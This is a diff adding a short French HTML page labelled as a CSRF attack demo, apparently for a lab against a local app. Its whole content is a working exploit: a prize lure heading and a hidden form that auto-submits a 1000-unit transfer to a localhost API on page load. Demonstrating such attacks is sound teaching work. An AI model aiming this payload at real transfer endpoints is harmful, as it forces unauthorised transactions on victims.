@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Démo attaque CSRF</title>
+  </head>
+  <body>
+    <main>
+      <h1>Tu as gagné un iPhone 🎉</h1>
+
+      <form action="http://localhost:5000/api/v1/transfers" method="POST">
+        <input type="hidden" name="amount" value="1000" />
+      </form>
+    </main>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
